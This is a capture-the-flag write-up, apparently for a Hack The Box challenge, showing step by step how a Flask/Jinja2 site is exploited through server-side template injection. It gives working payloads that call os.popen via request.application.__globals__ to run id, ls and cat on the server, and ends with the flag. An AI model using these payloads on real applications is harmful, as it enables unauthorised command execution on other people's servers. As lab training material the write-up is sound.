# Template 

In the host, we notice that the site is developped by ```flask``` (python)
```
Site still under construction
Proudly powered by Flask/Jinja2
```

By default, we are supposed to have a ```/console``` directory ! but when we try we have this error
```
Error 404
The page 'console' could not be found
```

Notice that the directory's name appear in the page, let's try this directory!
```
http://142.93.37.215:30029/{{7*7}}
```
> Yes, we try a SSTI attack

We have the following output on the web !
```
Error 404
The page '49' could not be found
```

So it's clear, it's a SSTI exploit ! then let's try the following command !
```
http://142.93.37.215:30029/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
> Trying to get the id user !

We've got the following output !
```
Error 404
The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found
```

We're ```root``` ! The let's discover our pwd or list the current directory !
```
http://142.93.37.215:30029/{{request.application.__globals__.__builtins__.__import__('os').popen('pwd').read()}}
```
> We are in the ```/``` directory !
```
http://142.93.37.215:30029/{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

The second output shows this !
```
Error 404
The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
```

Extracting the important files we have
```
bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

Notice there's a ```flag.txt``` file ! let's cat it !
```
http://142.93.37.215:30029/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

Indeed, we've get the flag !
```
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```

Done !
